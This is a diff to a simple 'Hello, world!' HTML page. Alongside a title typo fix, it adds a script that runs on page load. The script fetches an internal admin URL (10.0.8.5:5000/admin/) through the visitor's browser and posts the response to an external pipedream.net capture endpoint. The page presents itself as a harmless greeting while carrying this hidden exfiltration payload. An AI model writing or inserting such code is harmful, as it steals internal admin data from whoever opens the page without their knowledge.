@@ -1,12 +1,26 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Hello Wolrd!</title>
+<title>Hello, world!</title>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/      jquery.min.js"></script>
+<script>
+$.ajax({
+  type: "GET",
+  url: "http://10.0.8.5:5000/admin/",
+  success: function( data ) {
+    $.ajax({
+      type: "POST",
+      url: "https://entnqr4jmpdme.x.pipedream.net/testpost.html",
+      crossDomain: true,
+      data: data,
+      success: true
+    });
+    alert( "Load was performed." )
+  }
+});
+</script>
 </head>
-<body>
-
-<h1>Kind salute</h1>
-<p>:D</p>
-
-</body>
+   <body>
+          <h1>Hello, world!</h1>
+   </body>
 </html>
